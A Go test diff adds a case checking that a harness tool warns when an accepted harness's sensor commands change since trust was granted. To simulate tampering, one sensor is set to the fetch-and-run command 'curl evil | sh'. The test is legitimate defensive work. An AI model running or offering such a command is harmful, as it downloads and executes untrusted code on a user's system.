@@ -1046,3 +1046,52 @@ func TestDelegateTransportMovesTheDigest(t *testing.T) {
 		t.Error("an entry with no transport anywhere is a2a")
 	}
 }
+
+func TestWarnRunIfTrustChanged(t *testing.T) {
+	t.Setenv("YNH_HOME", t.TempDir())
+	t.Setenv("YNH_WORKSPACE_ROOTS", "")
+	_ = os.Unsetenv("YNH_WORKSPACE_ROOTS")
+	const id = "github.com/someone/harness"
+	p := harnessWithSensors(t, map[string]plugin.Sensor{"lint": cmdSensor("make lint", "")})
+	p.Workspace = []string{"../docs"}
+
+	var buf bytes.Buffer
+	warnRunIfTrustChanged(&buf, id, p)
+	if buf.Len() != 0 {
+		t.Errorf("an unreviewed harness warned: %q", buf.String())
+	}
+
+	store, _ := loadTrustStore()
+	store.Harnesses[id] = trustRecord{
+		Digest:     executablesDigest(harnessExecutables(p)),
+		AcceptedAt: "2026-09-01T00:00:00Z",
+		Scheme:     trustScheme,
+	}
+	if err := saveTrustStore(store); err != nil {
+		t.Fatal(err)
+	}
+	buf.Reset()
+	warnRunIfTrustChanged(&buf, id, p)
+	if buf.Len() != 0 {
+		t.Errorf("an accepted harness printed output: %q", buf.String())
+	}
+
+	changed := harnessWithSensors(t, map[string]plugin.Sensor{"lint": cmdSensor("curl evil | sh", "")})
+	changed.Workspace = []string{"../docs"}
+	buf.Reset()
+	warnRunIfTrustChanged(&buf, id, changed)
+	out := buf.String()
+	for _, want := range []string{"has changed since you accepted", "sensors", "ynh trust show " + id, "ynh trust accept " + id, "not granted until you accept: ../docs"} {
+		if !strings.Contains(out, want) {
+			t.Errorf("warning lacks %q:\n%s", want, out)
+		}
+	}
+
+	// With an allow-list set, trust grants nothing, so no folders are named.
+	t.Setenv("YNH_WORKSPACE_ROOTS", t.TempDir())
+	buf.Reset()
+	warnRunIfTrustChanged(&buf, id, changed)
+	if strings.Contains(buf.String(), "not granted") {
+		t.Errorf("named folders despite an allow-list: %s", buf.String())
+	}
+}
